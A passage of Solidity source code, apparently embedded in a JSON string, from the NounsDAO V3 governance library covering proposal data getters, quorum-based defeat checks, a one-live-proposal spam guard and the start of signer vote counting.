id: proposal.id,\n                proposer: proposal.proposer,\n                proposalThreshold: proposal.proposalThreshold,\n                quorumVotes: ds.quorumVotes(proposal.id),\n                eta: proposal.eta,\n                startBlock: proposal.startBlock,\n                endBlock: proposal.endBlock,\n                forVotes: proposal.forVotes,\n                againstVotes: proposal.againstVotes,\n                abstainVotes: proposal.abstainVotes,\n                canceled: proposal.canceled,\n                vetoed: proposal.vetoed,\n                executed: proposal.executed,\n                totalSupply: proposal.totalSupply,\n                creationBlock: proposal.creationBlock\n            });\n    }\n\n    /**\n     * @notice Returns the proposal details given a proposal id.\n     *     The `quorumVotes` member holds the *current* quorum, given the current votes.\n     * @param proposalId the proposal id to get the data for\n     * @return A `ProposalCondensed` struct with the proposal data\n     */\n    function proposalsV3(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId)\n        external\n        view\n        returns (NounsDAOStorageV3.ProposalCondensed memory)\n    {\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        return\n            NounsDAOStorageV3.ProposalCondensed({\n                id: proposal.id,\n                proposer: proposal.proposer,\n                proposalThreshold: proposal.proposalThreshold,\n                quorumVotes: ds.quorumVotes(proposal.id),\n                eta: proposal.eta,\n                startBlock: proposal.startBlock,\n                endBlock: proposal.endBlock,\n                forVotes: proposal.forVotes,\n                againstVotes: proposal.againstVotes,\n                abstainVotes: proposal.abstainVotes,\n                canceled: proposal.canceled,\n                vetoed: proposal.vetoed,\n                executed: proposal.executed,\n                totalSupply: proposal.totalSupply,\n                creationBlock: proposal.creationBlock,\n                signers: proposal.signers,\n                updatePeriodEndBlock: proposal.updatePeriodEndBlock,\n                objectionPeriodEndBlock: proposal.objectionPeriodEndBlock,\n                executeOnTimelockV1: proposal.executeOnTimelockV1\n            });\n    }\n\n    /**\n     * @notice Current proposal threshold using Noun Total Supply\n     * Differs from `GovernerBravo` which uses fixed amount\n     */\n    function proposalThreshold(NounsDAOStorageV3.StorageV3 storage ds, uint256 adjustedTotalSupply)\n        internal\n        view\n        returns (uint256)\n    {\n        return bps2Uint(ds.proposalThresholdBPS, adjustedTotalSupply);\n    }\n\n    function isDefeated(NounsDAOStorageV3.StorageV3 storage ds, NounsDAOStorageV3.Proposal storage proposal)\n        internal\n        view\n        returns (bool)\n    {\n        uint256 forVotes = proposal.forVotes;\n        return forVotes <= proposal.againstVotes || forVotes < ds.quorumVotes(proposal.id);\n    }\n\n    /**\n     * @notice reverts if `proposer` is the proposer or signer of an active proposal.\n     * This is a spam protection mechanism to limit the number of proposals each noun can back.\n     */\n    function checkNoActiveProp(NounsDAOStorageV3.StorageV3 storage ds, address proposer) internal view {\n        uint256 latestProposalId = ds.latestProposalIds[proposer];\n        if (latestProposalId != 0) {\n            NounsDAOStorageV3.ProposalState proposersLatestProposalState = stateInternal(ds, latestProposalId);\n            if (\n                proposersLatestProposalState == NounsDAOStorageV3.ProposalState.ObjectionPeriod ||\n                proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Active ||\n                proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Pending ||\n                proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Updatable\n            ) revert ProposerAlreadyHasALiveProposal();\n        }\n    }\n\n    /**\n     * @dev Extracted this function to fix the `Stack too deep` error `proposeBySigs` hit.\n     */\n    function verifySignersCanBackThisProposalAndCountTheirVotes(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        NounsDAOStorageV3.ProposerSignature[] memory proposerSignatures,\n        ProposalTxs memory txs,\n        string memory description,\n        uint256 proposalId\n    ) internal returns (uint256 votes, address[] memory signers) {\n        NounsTokenLike nouns = ds.nouns;\n        bytes memory proposalEncodeData = calcProposalEncodeData(msg.sender, txs, description);\n\n        signers = new address[](proposerSignatures.length);\n        uint256 numSigners = 0;\n        for (uint256 i = 0; i < proposerSignatures.length; ++i) {\n            verifyProposalSignature(ds, proposalEncodeData, proposerSignatures"
    }
  ]
}